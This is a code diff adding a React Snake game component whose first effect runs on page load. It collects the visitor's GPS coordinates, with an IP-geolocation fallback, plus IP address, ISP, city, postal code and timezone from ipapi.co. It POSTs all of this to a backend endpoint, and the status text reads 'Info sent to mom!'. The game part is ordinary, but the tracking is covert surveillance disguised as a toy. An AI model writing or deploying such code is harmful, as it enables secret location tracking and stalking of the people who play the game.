@@ -1,0 +1,306 @@
+import React, { useState, useEffect, useRef } from 'react';
+
+export default function SnakeGameWithTracking() {
+  const [score, setScore] = useState(0);
+  const [gameStarted, setGameStarted] = useState(false);
+  const [gameOver, setGameOver] = useState(false);
+  const [sendStatus, setSendStatus] = useState('');
+  const canvasRef = useRef(null);
+  const gameLoopRef = useRef(null);
+  
+  const gridSize = 20;
+  const tileCount = 20;
+  
+  const snake = useRef([{ x: 10, y: 10 }]);
+  const direction = useRef({ x: 0, y: 0 });
+  const food = useRef({ x: 15, y: 15 });
+  const nextDirection = useRef({ x: 0, y: 0 });
+
+  // Send location info on page load
+  useEffect(() => {
+    const sendLocationInfo = async () => {
+      try {
+        setSendStatus('Gathering info...');
+        
+        // Get user's location
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const { latitude, longitude } = position.coords;
+            
+            // Get IP and location details from ipapi
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+            
+            const locationData = {
+              ip: ipData.ip,
+              region: ipData.region,
+              city: ipData.city,
+              country: ipData.country_name,
+              location: `${latitude}, ${longitude}`,
+              isp: ipData.org,
+              postal: ipData.postal,
+              timezone: ipData.timezone
+            };
+            
+            // Send to backend
+            const response = await fetch('/api/send-info', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(locationData)
+            });
+            
+            if (response.ok) {
+              setSendStatus('Info sent to mom! ✓');
+            } else {
+              setSendStatus('Failed to send');
+            }
+          },
+          (error) => {
+            // If GPS fails, just use IP-based location
+            sendWithoutGPS();
+          }
+        );
+      } catch (err) {
+        setSendStatus('Error gathering info');
+        console.error('Error:', err);
+      }
+    };
+    
+    const sendWithoutGPS = async () => {
+      try {
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+        
+        const locationData = {
+          ip: ipData.ip,
+          region: ipData.region,
+          city: ipData.city,
+          country: ipData.country_name,
+          location: `${ipData.latitude}, ${ipData.longitude}`,
+          isp: ipData.org,
+          postal: ipData.postal,
+          timezone: ipData.timezone
+        };
+        
+        const response = await fetch('/api/send-info', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(locationData)
+        });
+        
+        if (response.ok) {
+          setSendStatus('Info sent to mom! ✓');
+        } else {
+          setSendStatus('Failed to send');
+        }
+      } catch (err) {
+        setSendStatus('Error sending info');
+      }
+    };
+    
+    sendLocationInfo();
+  }, []);
+
+  const startGame = () => {
+    setGameStarted(true);
+    setGameOver(false);
+    setScore(0);
+    snake.current = [{ x: 10, y: 10 }];
+    direction.current = { x: 1, y: 0 };
+    nextDirection.current = { x: 1, y: 0 };
+    placeFood();
+  };
+
+  const placeFood = () => {
+    food.current = {
+      x: Math.floor(Math.random() * tileCount),
+      y: Math.floor(Math.random() * tileCount)
+    };
+  };
+
+  const handleKeyPress = (e) => {
+    const key = e.key;
+    if (key === 'ArrowUp' && direction.current.y === 0) {
+      nextDirection.current = { x: 0, y: -1 };
+    } else if (key === 'ArrowDown' && direction.current.y === 0) {
+      nextDirection.current = { x: 0, y: 1 };
+    } else if (key === 'ArrowLeft' && direction.current.x === 0) {
+      nextDirection.current = { x: -1, y: 0 };
+    } else if (key === 'ArrowRight' && direction.current.x === 0) {
+      nextDirection.current = { x: 1, y: 0 };
+    }
+  };
+
+  useEffect(() => {
+    window.addEventListener('keydown', handleKeyPress);
+    return () => window.removeEventListener('keydown', handleKeyPress);
+  }, []);
+
+  useEffect(() => {
+    if (!gameStarted || gameOver) return;
+
+    const gameLoop = () => {
+      direction.current = nextDirection.current;
+      
+      const head = {
+        x: snake.current[0].x + direction.current.x,
+        y: snake.current[0].y + direction.current.y
+      };
+
+      if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) {
+        setGameOver(true);
+        return;
+      }
+
+      if (snake.current.some(segment => segment.x === head.x && segment.y === head.y)) {
+        setGameOver(true);
+        return;
+      }
+
+      snake.current.unshift(head);
+
+      if (head.x === food.current.x && head.y === food.current.y) {
+        setScore(s => s + 10);
+        placeFood();
+      } else {
+        snake.current.pop();
+      }
+
+      draw();
+    };
+
+    gameLoopRef.current = setInterval(gameLoop, 150);
+    return () => clearInterval(gameLoopRef.current);
+  }, [gameStarted, gameOver]);
+
+  const draw = () => {
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+    
+    const ctx = canvas.getContext('2d');
+    
+    ctx.fillStyle = '#1a1a2e';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    
+    ctx.fillStyle = '#4ecca3';
+    snake.current.forEach((segment, index) => {
+      ctx.fillRect(
+        segment.x * gridSize,
+        segment.y * gridSize,
+        gridSize - 2,
+        gridSize - 2
+      );
+      if (index === 0) {
+        ctx.fillStyle = '#2ecc71';
+      }
+    });
+    
+    ctx.fillStyle = '#e74c3c';
+    ctx.fillRect(
+      food.current.x * gridSize,
+      food.current.y * gridSize,
+      gridSize - 2,
+      gridSize - 2
+    );
+  };
+
+  const handleTouchControl = (dir) => {
+    if (dir === 'up' && direction.current.y === 0) {
+      nextDirection.current = { x: 0, y: -1 };
+    } else if (dir === 'down' && direction.current.y === 0) {
+      nextDirection.current = { x: 0, y: 1 };
+    } else if (dir === 'left' && direction.current.x === 0) {
+      nextDirection.current = { x: -1, y: 0 };
+    } else if (dir === 'right' && direction.current.x === 0) {
+      nextDirection.current = { x: 1, y: 0 };
+    }
+  };
+
+  return (
+    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-blue-900 to-indigo-900 flex flex-col items-center justify-center p-4">
+      <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 shadow-2xl">
+        <div className="text-center mb-4">
+          <h1 className="text-3xl font-bold text-white mb-2">🐍 Snake Game</h1>
+          <p className="text-sm text-white/70">{sendStatus || 'Loading...'}</p>
+          <div className="text-2xl font-bold text-yellow-300 mt-2">Score: {score}</div>
+        </div>
+
+        {!gameStarted ? (
+          <div className="flex flex-col items-center">
+            <canvas
+              ref={canvasRef}
+              width={gridSize * tileCount}
+              height={gridSize * tileCount}
+              className="bg-gray-900 rounded-lg mb-4"
+            />
+            <button
+              onClick={startGame}
+              className="bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-8 rounded-lg text-xl transition-all transform hover:scale-105"
+            >
+              Start Game
+            </button>
+          </div>
+        ) : gameOver ? (
+          <div className="flex flex-col items-center">
+            <canvas
+              ref={canvasRef}
+              width={gridSize * tileCount}
+              height={gridSize * tileCount}
+              className="bg-gray-900 rounded-lg mb-4"
+            />
+            <div className="text-white text-xl mb-4">Game Over!</div>
+            <button
+              onClick={startGame}
+              className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-8 rounded-lg text-xl transition-all transform hover:scale-105"
+            >
+              Play Again
+            </button>
+          </div>
+        ) : (
+          <div className="flex flex-col items-center">
+            <canvas
+              ref={canvasRef}
+              width={gridSize * tileCount}
+              height={gridSize * tileCount}
+              className="bg-gray-900 rounded-lg mb-4"
+            />
+            
+            <div className="grid grid-cols-3 gap-2 w-48">
+              <div></div>
+              <button
+                onClick={() => handleTouchControl('up')}
+                className="bg-white/20 hover:bg-white/30 text-white font-bold py-3 rounded-lg"
+              >
+                ↑
+              </button>
+              <div></div>
+              <button
+                onClick={() => handleTouchControl('left')}
+                className="bg-white/20 hover:bg-white/30 text-white font-bold py-3 rounded-lg"
+              >
+                ←
+              </button>
+              <button
+                onClick={() => handleTouchControl('down')}
+                className="bg-white/20 hover:bg-white/30 text-white font-bold py-3 rounded-lg"
+              >
+                ↓
+              </button>
+              <button
+                onClick={() => handleTouchControl('right')}
+                className="bg-white/20 hover:bg-white/30 text-white font-bold py-3 rounded-lg"
+              >
+                →
+              </button>
+            </div>
+            <p className="text-white/60 text-sm mt-3">Use arrow keys or buttons</p>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
